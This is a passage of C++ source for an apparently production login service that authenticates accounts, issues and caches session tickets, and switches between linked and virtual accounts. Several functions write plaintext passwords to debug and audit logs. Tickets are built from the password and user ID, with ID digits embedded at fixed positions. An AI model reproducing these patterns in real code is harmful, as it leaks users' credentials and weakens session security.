#include "LoginLogicI.h"
#include "ServiceI.h"
#include "IceLogger.h"
#include "util/cpp/String.h"
#include "QueryRunner.h"
#include "TicketAdapter.h"
#include "LoginCacheAdapter.h"
#include "util/cpp/TimeCost.h"
#include "ReplicaCluster/ServerState/src/client/cxx/ServerStateSubscriber.h"
#include "UserStateAdapter.h"
#include <util/cpp/InvokeMonitor.h>
#include <Monitor/client/service/ServiceMonitor.h>

#include "IdCacheReaderAdapter.h"

using passport::LoginLogicI;
using passport::MANAGER;
using passport::AccountInfoSeq;
using passport::AccountInfoPtr;
using passport::LoadUserIdByAccountHandler;
using passport::LoadUserIdByIdHandler;
using passport::LoadUserIdByAliasHandler;
using passport::LoadUserIdByDefaultAccountHandler;
using std::string;
using passport::LoginLogicIPtr;
using passport::CACHE_WAP;
using passport::CACHE_WEB;
using passport::CACHE_MOBILE_CLIENT;
using namespace com::xiaonei::xce;
using xce::userbase::UserPassportDataPtr;
using xce::adapter::userpassport::UserPassportAdapter;
using com::xiaonei::service::XceLoggerAdapter;
using passport::DoLoginTask;
using passport::DoLoginDefaultAccountTask;
using passport::DoLoginVirtualTask;
using xce::adapter::userstate::UserStateAdapter;
using xce::adapter::userstate::UserStateInfoPtr;
using MyUtil::ServiceMonitorManager;
using MyUtil::InvokeClient;
using Ice::Current;

using idcache::IdCacheReaderAdapter;
using idcache::IdRelationInfo;
using idcache::IdRelationInfoPtr;

void MyUtil::initialize() {
	ServiceI& service = ServiceI::instance();
	LoginLogicIPtr manager = new LoginLogicI;

	string cache =
			service.getCommunicator()->getProperties()->getPropertyWithDefault(
					"Service." + service.getName() + ".UseCache", "WEB");
	string db = "user_passport";
		//	service.getCommunicator()->getProperties()->getPropertyWithDefault(
		//			"Service." + service.getName() + ".Db", "user_passport");
	string controller;
	if (cache == "WAP") {
		manager->initialize(CACHE_WAP, db);
		controller = "ControllerWapLoginLogic";
	} else if (cache == "WEB"){
		manager->initialize(CACHE_WEB, db);
		controller = "ControllerLoginLogic";
	} else if (cache == "TESTWEB") {
		manager->initialize(CACHE_WEB, db);
		controller = "ControllerTestLoginLogic";
	} else if (cache == "TESTWAP") {
		manager->initialize(CACHE_WAP, db);
		controller = "ControllerTestWapLoginLogic";
	} else if (cache == "TESTMOBILECLIENT") {
		manager->initialize(CACHE_MOBILE_CLIENT, db);
		controller = "ControllerTestMobileClientLoginLogic";
	} else {
		manager->initialize(CACHE_MOBILE_CLIENT, db);
		controller = "ControllerMobileClientLoginLogic";
	}

	service.getAdapter()->add(manager, service.createIdentity(MANAGER, ""));
	int mod = service.getCommunicator()->getProperties()->getPropertyAsInt("LoginLogic.Mod");
        int interval = service.getCommunicator()->getProperties()->getPropertyAsIntWithDefault("LoginLogic.Interval", 5);
	xce::serverstate::ServerStateSubscriber::instance().initialize(controller, manager, mod, interval, new MyUtil::OceChannel,"2000", "2000", "131072");
  xce::serverstate::ServerStateSubscriber::instance().setStatus(1);
  ServiceMonitorManager::instance().start();
}

LoginLogicI::LoginLogicI() {
}

void LoginLogicI::initialize(int cache_type, std::string db_passport) {
	_db_passport = db_passport;
	if (cache_type == CACHE_WAP) {
		_cache_adapter = &WapLoginCacheAdapter::instance();
	} else if (cache_type == CACHE_WEB) {
		_cache_adapter = &WebLoginCacheAdapter::instance();
	} else {
		_cache_adapter = &MobileClientLoginCacheAdapter::instance();
	}
	Ice::CommunicatorPtr ic = ServiceI::instance().getCommunicator();
	category_.push_back("passport");
	category_.push_back("login");
	string endPoints="M@XceLogger";
 	logger_ = XceLoggerAdapter::instance().getLogger(endPoints);
 	logger_->initialize();
}
void LoginLogicI::addLog(const string& account, const string& pwd, const string& site,
                int second, bool reuse_ticket, const AccountInfoSeq& ais) const{
        ostringstream oss;
	oss << time(NULL) << " account=" << account << " pwd=" << pwd << " site=" << site;
	oss << " second=" << second << " reuse=" << reuse_ticket << " ";

        for(size_t i=0;i<ais.size();++i)
        {
		oss << "[success=" << ais[i]->success; 
		oss << " account=" << ais[i]->account;
		oss << " userId=" << ais[i]->userId;
		oss << " domain=" << ais[i]->domain;
		oss << "]";
        }
	logger_->addLog(category_, oss.str());
}

bool LoginLogicI::runExecSeqWithDefaultAccount(const string& account, const string& pwd,
		const AccountTypeSeq& ats, AccountInfoSeq& ais, bool needall = false) {
	string site;
	int flag = 0;
	int tag = 0;
	for (AccountTypeSeq::const_iterator it = ats.begin(); it != ats.end(); ++it) {
		switch (*it) {
		case Account:
			flag = loadUserIdByDefaultAccount(account, pwd, ais);
			break;
		case Phone: {
			if (only_num(account) && account.size()== 11 )
				flag = loadUserIdByPhone(account, pwd, ais);
			else
				flag = 0;
		}
			break;
		case Id: {
			if(only_num(account))
				flag = loadUserIdById(account, pwd, ais);
			else
				flag = 0;
		}
			break;
		case BindedId:
			flag = loadUserIdByNickName(account, pwd, ais);
			break;
		default:
			break;
		}
		if(flag)
			tag = flag;
		if (flag && !needall)
			break;
	}
	return tag;
}
bool LoginLogicI::runExecSeq(const string& account, const string& pwd,
		const AccountTypeSeq& ats, AccountInfoSeq& ais, bool needall = false) {
	string site;
	int flag = 0;
	int tag = 0;
	for (AccountTypeSeq::const_iterator it = ats.begin(); it != ats.end(); ++it) {
		switch (*it) {
		case Account:
			flag = loadUserIdByAccount(account, pwd, ais);
			break;
		case Phone: {
			if (only_num(account) && account.size()== 11 )
				flag = loadUserIdByPhone(account, pwd, ais);
			else
				flag = 0;
		}
			break;
		case Id: {
			if(only_num(account))
				flag = loadUserIdById(account, pwd, ais);
			else
				flag = 0;
		}
			break;
		case BindedId:
			flag = loadUserIdByNickName(account, pwd, ais);
			break;
		default:
			break;
		}
		if(flag)
			tag = flag;
		if (flag && !needall)
			break;
	}
	return tag;
}
bool LoginLogicI::only_num(const string& account) const{
	for(size_t i = 0; i < account.size(); ++i) {
		if(account.at(i) < '0' || account.at(i) > '9')
			return false;
	}
	return true;
}

void LoginLogicI::loginDefaultAccount_async(const ::passport::AMD_LoginLogic_loginDefaultAccountPtr& callback,
		const ::passport::AccountTypeSeq& ats,
		const ::std::string& account,
		const ::std::string& pwd,
		const ::std::string& site,
		::Ice::Int second,
		bool reuse_ticket, const ::Ice::Current& current) {
	MyUtil::TaskManager::instance().execute(new DoLoginDefaultAccountTask(*this, callback, ats, account, pwd, site, second, reuse_ticket,InvokeClient::create(current)));
}

void LoginLogicI::loginVirtual_async(const ::passport::AMD_LoginLogic_loginVirtualPtr& callback,
		const ::passport::AccountTypeSeq& ats,
		const ::std::string& account,
		const ::std::string& pwd,
		const ::std::string& site,
		::Ice::Int second,
		bool reuse_ticket, const ::Ice::Current& current) {
	MyUtil::TaskManager::instance().execute(new DoLoginVirtualTask(*this, callback, ats, account, pwd, site, second, reuse_ticket,InvokeClient::create(current)));
}

void LoginLogicI::login_async(const ::passport::AMD_LoginLogic_loginPtr& callback,
		const ::passport::AccountTypeSeq& ats,
		const ::std::string& account,
		const ::std::string& pwd,
		const ::std::string& site,
		::Ice::Int second,
		bool reuse_ticket, const ::Ice::Current& current) {
	MyUtil::TaskManager::instance().execute(new DoLoginTask(*this, callback, ats, account, pwd, site, second, reuse_ticket, InvokeClient::create(current)));
}

void DoLoginTask::handle(){
try{
	MCE_DEBUG("DoLoginTask::handle " <<account<<" password:"<<pwd<<" site:"<<site <<" reuse:"<< reuse_ticket);
	TimeCost tc = TimeCost::create("login");
	/*Ice::Context ctx = current.ctx;
	 Ice::Context::const_iterator ctx_it = ctx.find("STACK_TRACE");
	 if(ctx_it != ctx.end()){
	 MCE_DEBUG("STACK_TRACE :" << ctx_it->second);
	 } else {
	 MCE_DEBUG("STACK_TRACE :");
	 }*/
	AccountInfoSeq ais;
	manager.runExecSeq(account, pwd, ats, ais);
	tc.step("load_db_stepping");
	for (AccountInfoSeq::iterator it = ais.begin(); it != ais.end(); ++it) {
		if ((*it)->success != 0)
			continue;
		string ticket;
		bool reuse_success = false;
		if (reuse_ticket) {
			string remote_ticket = manager._cache_adapter->id2Ticket((*it)->userId);
			tc.step("cache_id2ticket_stepping");
			if (!remote_ticket.empty()) {
				if( ((*it)->userId/10)%10 == (remote_ticket.at(17)-'0')
					       	&& ((*it)->userId/100)%10 == (remote_ticket.at(23)-'0')
					       	&& ((*it)->userId/1000)%10 == (remote_ticket.at(29)-'0') ) {
					(*it)->ticket = remote_ticket;
				}else {
					(*it)->ticket = manager.generateTicket((*it)->userId, account, pwd, (*it)->domain);
					manager._cache_adapter->set((*it)->userId,(*it)->ticket,second);
					MCE_DEBUG("find old ticket generate for userId: "<<(*it)->userId<<" ticket:"<<(*it)->ticket);
				}
				reuse_success = true;
			}
		}
		if (!reuse_success) {
			(*it)->ticket = manager.generateTicket((*it)->userId, account, pwd, (*it)->domain);
			tc.step("generate_stepping");
			manager._cache_adapter->set((*it)->userId,(*it)->ticket, second);
			tc.step("cache_set_stepping");
			MCE_DEBUG("find userId: "<<(*it)->userId<<" ticket:"<<(*it)->ticket);
		}
		MCE_DEBUG("Successed login: " << account
				<< " success="<<(*it)->success
				<< " userId=" <<(*it)->userId
				<< " account=" <<(*it)->account
				<< " status=" << (*it)->status
				<< " domain=" << (*it)->domain
				<< " ticket=" << (*it)->ticket);
	}
	if(ais.size()==0){
		AccountInfoPtr aip = new AccountInfo;
		aip->account=account;
		aip->domain=site;
		aip->ticket="";
		aip->success = -1;
		aip->userId = -1;
		aip->status = -1;
		ais.push_back(aip);
	}
	manager.addLog(account, pwd, site, second, reuse_ticket, ais);
	callback->ice_response(ais);
} catch (std::exception& e) {
	callback->ice_exception(e);
} catch (...) {
	callback->ice_exception();
}

}

void DoLoginVirtualTask::handle(){
try{
	MCE_DEBUG("DoLoginVirtualTask::handle " <<account<<" password:"<<pwd<<" site:"<<site <<" reuse:"<< reuse_ticket);
	TimeCost tc = TimeCost::create("login");
	AccountInfoSeq ais;
	manager.runExecSeqWithDefaultAccount(account, pwd, ats, ais);
	if(ais.size()==0){
		AccountInfoPtr aip = new AccountInfo;
		aip->account=account;
		aip->domain=site;
		aip->ticket="";
		aip->success = -1;
		aip->userId = -1;
		aip->status = -1;
		ais.push_back(aip);
	}else{
		tc.step("load_db_stepping");
		for (AccountInfoSeq::iterator it = ais.begin(); it != ais.end(); ++it) {
			if ((*it)->success != 0){
				continue;
			}
			changeIfVirtual(*it);
			string ticket;
			bool reuse_success = false;
			if (reuse_ticket) {
				string remote_ticket = manager._cache_adapter->id2Ticket((*it)->userId);
				tc.step("cache_id2ticket_stepping");
				if (!remote_ticket.empty()) {
					if( ((*it)->userId/10)%10 == (remote_ticket.at(17)-'0')
								&& ((*it)->userId/100)%10 == (remote_ticket.at(23)-'0')
								&& ((*it)->userId/1000)%10 == (remote_ticket.at(29)-'0') ) {
						(*it)->ticket = remote_ticket;
					}else {
						(*it)->ticket = manager.generateTicket((*it)->userId, account, pwd, (*it)->domain);
						manager._cache_adapter->set((*it)->userId,(*it)->ticket,second);
						MCE_DEBUG("find old ticket generate for userId: "<<(*it)->userId<<" ticket:"<<(*it)->ticket);
					}
					reuse_success = true;
				}
			}
			if (!reuse_success) {
				(*it)->ticket = manager.generateTicket((*it)->userId, account, pwd, (*it)->domain);
				tc.step("generate_stepping");
				manager._cache_adapter->set((*it)->userId,(*it)->ticket, second);
				tc.step("cache_set_stepping");
				MCE_DEBUG("find userId: "<<(*it)->userId<<" ticket:"<<(*it)->ticket);
			}
			MCE_DEBUG("Successed login: " << account
					<< " success="<<(*it)->success
					<< " userId=" <<(*it)->userId
					<< " account=" <<(*it)->account
					<< " status=" << (*it)->status
					<< " domain=" << (*it)->domain
					<< " ticket=" << (*it)->ticket);
		}
	}
	manager.addLog(account, pwd, site, second, reuse_ticket, ais);
	callback->ice_response(ais);
} catch (std::exception& e) {
	callback->ice_exception(e);
} catch (...) {
	callback->ice_exception();
}

}

void DoLoginVirtualTask::changeIfVirtual(const ::passport::AccountInfoPtr& accountInfo){
  UserStateInfoPtr userState; 
  try {
	userState = UserStateAdapter::instance().getUserState(accountInfo->userId);
    MCE_INFO("DoLoginVirtualTask::changeIfVirtual::getUserStateData "<<accountInfo->userId);
  } catch (const Ice::Exception& e) {
    MCE_WARN("DoLoginVirtualTask::changeIfVirtual id " << accountInfo->userId <<" getUserState Ice::Exception " << e);
	return;
  }
  
  if(userState->isPageManager() == false){
	  return;
  }

  int virtualId;
  long switchTime = 0;
  if(getVirtualIdIfLastLogin(accountInfo->userId, switchTime, virtualId) == false){
	  return;
  } 
  accountInfo->userId = virtualId;
}

bool DoLoginVirtualTask::getVirtualIdIfLastLogin(const int userId, long& switchTime, int& virtualId){
  try {
	bool isLastLogin;
    Statement sql;
    sql << "SELECT virtual_id, switch_time, is_last_login FROM page_admin WHERE user_id='" << userId <<"'";
    size_t qsize = QueryRunner("page", CDbRServer) .query(sql, LoadVirtualIdHandler(virtualId, switchTime, isLastLogin));
    if (qsize <= 0) {
      return false;
    }
	if(isLastLogin){
		return true;
	}
	return false;
  } catch (const Ice::Exception& e) {
    MCE_WARN("DoLoginVirtualTask::getVirtualIdIfLastLogin userId = " << userId << " Ice::Exception " << e);
  } catch (const mysqlpp::Exception& e) {
    MCE_WARN("DoLoginVirtualTask::getVirtualIdIfLastLogin userId = " << userId << " mysqlpp::exception " << e.what());
  } catch (const std::exception& e) {
    MCE_WARN("DoLoginVirtualTask::getVirtualIdIfLastLogin userId = " << userId << " std::exception " << e.what());
  } catch (...) {
    MCE_WARN("DoLoginVirtualTask::getVirtualIdIfLastLogin userId = " << userId << " unknown exception");
  }
  return false;
}

void DoLoginDefaultAccountTask::handle(){
try{
	MCE_DEBUG("DoLoginDefaultAccountTask::handle " <<account<<" password:"<<pwd<<" site:"<<site <<" reuse:"<< reuse_ticket);
	TimeCost tc = TimeCost::create("login");
	/*Ice::Context ctx = current.ctx;
	 Ice::Context::const_iterator ctx_it = ctx.find("STACK_TRACE");
	 if(ctx_it != ctx.end()){
	 MCE_DEBUG("STACK_TRACE :" << ctx_it->second);
	 } else {
	 MCE_DEBUG("STACK_TRACE :");
	 }*/
	AccountInfoSeq ais;
	manager.runExecSeqWithDefaultAccount(account, pwd, ats, ais);
	tc.step("load_db_stepping");
	for (AccountInfoSeq::iterator it = ais.begin(); it != ais.end(); ++it) {
		if ((*it)->success != 0)
			continue;
		string ticket;
		bool reuse_success = false;
		if (reuse_ticket) {
			string remote_ticket = manager._cache_adapter->id2Ticket((*it)->userId);
			tc.step("cache_id2ticket_stepping");
			if (!remote_ticket.empty()) {
				if( ((*it)->userId/10)%10 == (remote_ticket.at(17)-'0')
					       	&& ((*it)->userId/100)%10 == (remote_ticket.at(23)-'0')
					       	&& ((*it)->userId/1000)%10 == (remote_ticket.at(29)-'0') ) {
					(*it)->ticket = remote_ticket;
				}else {
					(*it)->ticket = manager.generateTicket((*it)->userId, account, pwd, (*it)->domain);
					manager._cache_adapter->set((*it)->userId,(*it)->ticket,second);
					MCE_DEBUG("find old ticket generate for userId: "<<(*it)->userId<<" ticket:"<<(*it)->ticket);
				}
				reuse_success = true;
			}
		}
		if (!reuse_success) {
			(*it)->ticket = manager.generateTicket((*it)->userId, account, pwd, (*it)->domain);
			tc.step("generate_stepping");
			manager._cache_adapter->set((*it)->userId,(*it)->ticket, second);
			tc.step("cache_set_stepping");
			MCE_DEBUG("find userId: "<<(*it)->userId<<" ticket:"<<(*it)->ticket);
		}
		MCE_DEBUG("Successed login: " << account
				<< " success="<<(*it)->success
				<< " userId=" <<(*it)->userId
				<< " account=" <<(*it)->account
				<< " status=" << (*it)->status
				<< " domain=" << (*it)->domain
				<< " ticket=" << (*it)->ticket);
	}
	if(ais.size()==0){
		AccountInfoPtr aip = new AccountInfo;
		aip->account=account;
		aip->domain=site;
		aip->ticket="";
		aip->success = -1;
		aip->userId = -1;
		aip->status = -1;
		ais.push_back(aip);
	}
	manager.addLog(account, pwd, site, second, reuse_ticket, ais);
	callback->ice_response(ais);
} catch (std::exception& e) {
	callback->ice_exception(e);
} catch (...) {
	callback->ice_exception();
}

}

string LoginLogicI::createTicket(::Ice::Int id, ::Ice::Int expire, bool reuse, const Ice::Current& current){
  InvokeClient ic = InvokeClient::create(current);
	if(reuse){
		string ticket = _cache_adapter->id2Ticket(id);
		if(""!=ticket) return ticket;
	}
	MCE_INFO("LoginLogic::LoadUserPassportData "<<id);
	xce::adapter::userpassport::UserPassportInfoPtr up = UserPassportAdapter::instance().getUserPassport(id);
	MCE_INFO("LoginLogic::GetUserPassportData "<<id);
	if(!up) return "";
	string ticket = generateTicket(id, up->account(), up->passwordmd5(), up->domain());
	_cache_adapter->set(id, ticket, expire);
	return ticket;
}

bool LoginLogicI::has(AccountType at, const string& name,
		const Ice::Current& current) {
  InvokeClient ic = InvokeClient::create(current, "", InvokeClient::INVOKE_LEVEL_DEBUG);
	Ice::Context ctx = current.ctx;
	MCE_DEBUG("STACK_TRACE :"<<ctx["STACK_TRACE"]);
	AccountTypeSeq ats;
	AccountInfoSeq ais;
	ats.push_back(at);
	return runExecSeq(name, string(), ats, ais);
}

bool LoginLogicI::exist(const string& name, const Current& current) {
  InvokeClient ic = InvokeClient::create(current, "", InvokeClient::INVOKE_LEVEL_DEBUG);
  try {
    Statement sql;
    sql << "SELECT FROM user_alias WHERE account=" << mysqlpp::quote << name;
    size_t qsize = QueryRunner("user_alias", CDbRServer) .query(sql, LoadUserIdByAliasHandler());
    if (qsize <= 0) {
      return false;
    }
  } catch (const Ice::Exception& e) {
    MCE_WARN("LoginLogicI::exist Ice::Exception " << e);
  } catch (const mysqlpp::Exception& e) {
    MCE_WARN("LoginLogicI::exist mysqlpp::exception " << e.what());
  } catch (const std::exception& e) {
    MCE_WARN("LoginLogicI::exist std::exception " << e.what());
  } catch (...) {
    MCE_WARN("LoginLogicI::exist unknown exception");
  }
  return true;
}

bool LoginLogicI::bind(int id, const string& name, const Current& current) {
  InvokeClient ic = InvokeClient::create(current, "", InvokeClient::INVOKE_LEVEL_INFO);
  try {
    Statement sql;
    sql << "INSERT INTO user_alias (userid, account, switch_time) VALUES (" << id << "," << mysqlpp::quote << name << "," << time(0) << ")";
    QueryRunner("user_alias", CDbWServer).execute(sql);
    return true;
  } catch (const Ice::Exception& e) {
    MCE_WARN("LoginLogicI::bind Ice::Exception " << e);
  } catch (const mysqlpp::Exception& e) {
    MCE_WARN("LoginLogicI::bind mysqlpp::Exception " << e.what());
  } catch (const std::exception& e) {
    MCE_WARN("LoginLogicI::bind std::exception " << e.what());
  } catch (...) {
    MCE_WARN("LoginLogicI::bind unknown exception");
  }
  return false;
}

bool LoginLogicI::unbind(int id, const string& name, const Current& current) {
  InvokeClient ic = InvokeClient::create(current, "", InvokeClient::INVOKE_LEVEL_INFO);
  try {
    Statement sql;
    sql << "DELETE FROM user_alias WHERE userid=" << id << " AND account=" << mysqlpp::quote << name;
    QueryRunner("user_alias", CDbWServer).execute(sql);
    return true;
  } catch (const Ice::Exception& e) {
    MCE_WARN("LoginLogicI::unbind Ice::Exception " << e);
  } catch (const mysqlpp::Exception& e) {
    MCE_WARN("LoginLogicI::unbind mysqlpp::Exception " << e.what());
  } catch (const std::exception& e) {
    MCE_WARN("LoginLogicI::unbind std::exception " << e.what());
  } catch (...) {
    MCE_WARN("LoginLogicI::unbind unknown exception");
  }
  return false;
}

bool LoginLogicI::hasWithTypes(const AccountTypeSeq& types, const string& name, const Ice::Current& current) {
  InvokeClient ic = InvokeClient::create(current,"",InvokeClient::INVOKE_LEVEL_DEBUG);
	Ice::Context ctx = current.ctx;
	MCE_DEBUG("[LoginLogicI::hasWithTypes] STACK_TRACE :" << ctx["STACK_TRACE"]);
	AccountTypeSeq ats;
	AccountInfoSeq ais;
	for(AccountTypeSeq::const_iterator it = types.begin(); it != types.end(); ++it) {
		ats.push_back(*it);
	}
	return runExecSeq(name, string(), ats, ais);
}

AccountInfoSeq LoginLogicI::getWithTypes(const AccountTypeSeq& types, const string& name, const Ice::Current& current) {
  InvokeClient ic = InvokeClient::create(current,"",InvokeClient::INVOKE_LEVEL_DEBUG);
	Ice::Context ctx = current.ctx;
	MCE_DEBUG("[LoginLogicI::getWithTypes] STACK_TRACE :"<< ctx["STACK_TRACE"]);
	AccountTypeSeq ats;
	AccountInfoSeq ais;
	for(AccountTypeSeq::const_iterator it = types.begin(); it != types.end(); ++it) {
		ats.push_back(*it);
	}
	runExecSeq(name, string(), ats, ais, true);
	return ais;
}

AccountInfoSeq LoginLogicI::get(AccountType at, const string& name,
		const Ice::Current& current) {
  InvokeClient ic = InvokeClient::create(current,"",InvokeClient::INVOKE_LEVEL_DEBUG);
	Ice::Context ctx = current.ctx;
	MCE_DEBUG("STACK_TRACE :"<<ctx["STACK_TRACE"]);
	AccountTypeSeq ats;
	AccountInfoSeq ais;
	ats.push_back(at);
	if (runExecSeq(name, string(), ats, ais) == 1) {
		return ais;
	} else {
		return ais;
	}
}

AccountInfoSeq LoginLogicI::getById(::Ice::Int id, const Ice::Current& current) {
    InvokeClient ic = InvokeClient::create(current,"",InvokeClient::INVOKE_LEVEL_DEBUG);
	Ice::Context ctx = current.ctx;
	MCE_DEBUG("STACK_TRACE :"<<ctx["STACK_TRACE"]);

	AccountInfoSeq ais;
	
	IdRelationInfoPtr idRelationInfo; 
	try {
		idRelationInfo = IdCacheReaderAdapter::instance().getIdRelationInfo(id);

		if(!idRelationInfo){
			return ais;
		}

		int directId = idRelationInfo->directId;
		
		xce::adapter::userpassport::UserPassportInfoPtr dUp = NULL;
		try {
			dUp = UserPassportAdapter::instance().getUserPassport(directId);
			MCE_INFO("LoginLogic::getById "<<directId);
		} catch (const Ice::Exception& e) {
			MCE_WARN("LoginLogicI::getById id = " << directId << " Ice::Exception " << e);
			return ais;
		}

		for(MyUtil::Int2IntSeqMap::const_iterator it = idRelationInfo->relatedIds.begin(); it != idRelationInfo->relatedIds.end(); ++it){
			xce::adapter::userpassport::UserPassportInfoPtr up = NULL;
			if(it->first == directId){
				up = dUp;
			}
			else{
				try {
					up = UserPassportAdapter::instance().getUserPassport(it->first);
					MCE_INFO("LoginLogic::getById "<<it->first);
				} catch (const Ice::Exception& e) {
					MCE_WARN("LoginLogicI::getById id = " << id << " Ice::Exception " << e);
					continue;
				}
			}
			if (!up) {
				continue;
			}
			if(it->first != id){
				AccountInfoPtr aip = new AccountInfo;
				aip->userId = up->id();
				aip->success = up->passwordmd5() == dUp->passwordmd5() ? 0 : -2;
				aip->account = up->account();
				aip->domain = up->domain();
				aip->status = up->status();
				ais.push_back(aip);
			}
			for(MyUtil::IntSeq::const_iterator iIt = it->second.begin(); iIt != it->second.end(); ++iIt){
				if(*iIt == id){
					continue;
				}
				AccountInfoPtr aip = new AccountInfo;
				aip->userId = *iIt;
				aip->success = up->passwordmd5() == dUp->passwordmd5() ? 0 : -2;
				aip->account = up->account();
				aip->domain = up->domain();
				aip->status = up->status();
				ais.push_back(aip);
			}
		}
	} catch (const Ice::Exception& e) {
		MCE_WARN("LoginLogicI::getById.getIdRelationInfo id = " << id << " Ice::Exception " << e);
	}
	return ais;
}

string LoginLogicI::generateTicket(int userId,const string& account, const string& pwd,
		const string& domain) {
	ostringstream txt;
	txt << userId << account << pwd << domain << time(NULL);
	string ticket = StrUtil::md5(txt.str())+char(userId%10+'0');
	ticket[17]=char((userId/10)%10+'0');
	ticket[23]=char((userId/100)%10+'0');
	ticket[29]=char((userId/1000)%10+'0');
	MCE_DEBUG("generateTicket userId "<<userId<<" account="<<account<< " pwd=" << pwd << " domain="<<domain << " return:" << ticket);
	return ticket;
}

void LoginLogicI::updateSwitchTime(int userid) const {
  time_t now = time(0);
  Statement sql;
  sql << "UPDATE multi_ids_map SET switch_time=" <<now << " WHERE userid="<<userid;
  QueryRunner("user_passport", CDbWServer).schedule(sql);
}

void LoginLogicI::updateVirtualIdSwitchTime(int virtualId, bool isLastLogin) const {
  time_t now = time(0);
  Statement sql;
  sql << "UPDATE page_admin SET switch_time='" <<mysqlpp::DateTime(now) << "', is_last_login="<<isLastLogin<<" WHERE virtual_id="<<virtualId;
  QueryRunner("page", CDbWServer).schedule(sql);
}

AccountInfoPtr LoginLogicI::switchAccount(::Ice::Int id, const string& pwd, bool reuse_ticket, const Ice::Current& current) {
  InvokeClient ic = InvokeClient::create(current);
  AccountInfoSeq ais;
  loadUserIdById(id, "", ais);
  if (!ais.empty()) {
    updateSwitchTime(id);
    bool reuse_success = false;
    if (reuse_ticket) {
      string remote_ticket = _cache_adapter->id2Ticket(ais.at(0)->userId);
      if (!remote_ticket.empty()) {
        if( (ais.at(0)->userId/10)%10 == (remote_ticket.at(17)-'0')
          && (ais.at(0)->userId/100)%10 == (remote_ticket.at(23)-'0')
          && (ais.at(0)->userId/1000)%10 == (remote_ticket.at(29)-'0') ) {
          ais.at(0)->ticket = remote_ticket;
        } else {
          ais.at(0)->ticket = generateTicket(ais.at(0)->userId, ais.at(0)->account, pwd, ais.at(0)->domain);
          _cache_adapter->set(ais.at(0)->userId,ais.at(0)->ticket,-1);
        }
        reuse_success = true;
      }
    }
    if (!reuse_success) {
      ais.at(0)->ticket = generateTicket(ais.at(0)->userId, ais.at(0)->account, pwd, ais.at(0)->domain);
      _cache_adapter->set(ais.at(0)->userId,ais.at(0)->ticket, -1);
    }
    return ais.at(0);
  } else {
    return NULL;
  }
}

AccountInfoPtr LoginLogicI::switchAccountIncVirtualId(::Ice::Int sourceId, ::Ice::Int desId, const string& desPwd, bool reuse_ticket, const Ice::Current& current) {
  InvokeClient ic = InvokeClient::create(current);
 
  if(IdCacheReaderAdapter::instance().isVirtualId(sourceId)){
	  updateVirtualIdSwitchTime(sourceId, false);
  }
  
  int desUserId = desId;
  
  if(IdCacheReaderAdapter::instance().isVirtualId(desId)){
	  try{
		  desUserId = IdCacheReaderAdapter::instance().getRelatedUserId(desId);
	  }catch(Ice::Exception& e){
		  MCE_WARN("LoginLogicI::switchAccountIncVirtualId.getRelatedUserId desId = " << desId << " Ice::Exception " << e);
		  return NULL;
	  }
  }
	  
  MCE_INFO("LoginLogic::switchAccountIncVirtualId.getUserStateData "<<desUserId);
  xce::adapter::userstate::UserStateInfoPtr us = NULL;
  try {
	  us = UserStateAdapter::instance().getUserState(desUserId);
	  MCE_INFO("LoginLogic::switchAccountIncVirtualId.getUserState "<<desUserId);
  } catch (const Ice::Exception& e) {
	  MCE_WARN("LoginLogicI::switchAccountIncVirtualId.getUserState id = " << desUserId << " Ice::Exception " << e);
	  return NULL;
  }
  if(us){
	  if(us->isDoubleAccount()){
		  updateSwitchTime(desUserId);
	  }
  }
  
  if(desId != desUserId){
	  updateVirtualIdSwitchTime(desId, true);
  }
  
  AccountInfoSeq ais;
  
  loadUserIdById(desUserId, "", ais);
  if (!ais.empty()) {
	ais.at(0)->userId = desId;
    bool reuse_success = false;
    if (reuse_ticket) {
      string remote_ticket = _cache_adapter->id2Ticket(ais.at(0)->userId);
      if (!remote_ticket.empty()) {
        if( (ais.at(0)->userId/10)%10 == (remote_ticket.at(17)-'0')
          && (ais.at(0)->userId/100)%10 == (remote_ticket.at(23)-'0')
          && (ais.at(0)->userId/1000)%10 == (remote_ticket.at(29)-'0') ) {
          ais.at(0)->ticket = remote_ticket;
        } else {
          ais.at(0)->ticket = generateTicket(ais.at(0)->userId, ais.at(0)->account, desPwd, ais.at(0)->domain);
          _cache_adapter->set(ais.at(0)->userId,ais.at(0)->ticket,-1);
        }
        reuse_success = true;
      }
    }
    if (!reuse_success) {
      ais.at(0)->ticket = generateTicket(ais.at(0)->userId, ais.at(0)->account, desPwd, ais.at(0)->domain);
      _cache_adapter->set(ais.at(0)->userId,ais.at(0)->ticket, -1);
    }
    return ais.at(0);
  } else {
    return NULL;
  }
}

AccountInfoPtr LoginLogicI::id2Account(::Ice::Int id,
		const Ice::Current& current) {
  InvokeClient ic = InvokeClient::create(current, "", InvokeClient::INVOKE_LEVEL_DEBUG);
	//	int uid = loadPersistent(ticket);
	MCE_DEBUG("id2Account :"<< id);
	AccountInfoSeq ais;
	loadUserIdById(id, "", ais);
	if (!ais.empty()) {
		return ais.at(0);
	} else {
		return NULL;
	}
}

int LoginLogicI::loadUserIdByDefaultAccount(const string& account, const string& pwd,
		AccountInfoSeq& ais) {
	MCE_DEBUG("Loading userId from db name:" << account <<" pwd:"<<pwd);
	Statement sql;
	sql
			<< "SELECT id FROM user_passport WHERE account = "
			<< mysqlpp::quote << account << " LIMIT 20";
  AccountInfoSeq accounts;
	size_t qsize = QueryRunner(_db_passport, CDbRServer) .query(sql,
			LoadUserIdByAccountHandler(accounts, pwd));

  //无帐号
	if (qsize <= 0) {
		AccountInfoPtr aip = new AccountInfo;
		aip->success = -1;
		aip->userId = -1;
		ais.push_back(aip);
		return 0;
	}

  //单帐号
  if (qsize == 1) {
    ais.push_back(accounts.at(accounts.size()-1));
    return 1;
  }

  //多帐号
  AccountInfoSeq successes;
  for (AccountInfoSeq::iterator i = accounts.begin(); i != accounts.end(); ++i) {
    if ((*i)->success == 0) {
      successes.push_back(*i);
    }
  }
  //密码匹配个数小于等于一个，即返回
  if (successes.size() <= 1) {
    ais.insert(ais.end(), accounts.begin(), accounts.end());
    return 1;
  }

  //密码匹配个数大于一个，则以switch为主
  map<int, long> accountsmap;
  Statement sql1;
  sql1 << "SELECT * FROM multi_ids_map WHERE userid IN (";
  for (AccountInfoSeq::iterator j = successes.begin(); j != successes.end(); ++j) {
    if (j != successes.begin()) {
      sql1 << ",";
    }
    sql1 << (*j)->userId;
  }
  sql1 << ")";
  QueryRunner(_db_passport, CDbRServer) .query(sql1, LoadUserIdByDefaultAccountHandler(accountsmap));
  if (accountsmap.size()>0) {
    int loginid=INT_MAX;
    long maxtime=0;
    for (map<int, long>::iterator i = accountsmap.begin(); i != accountsmap.end(); ++i) {
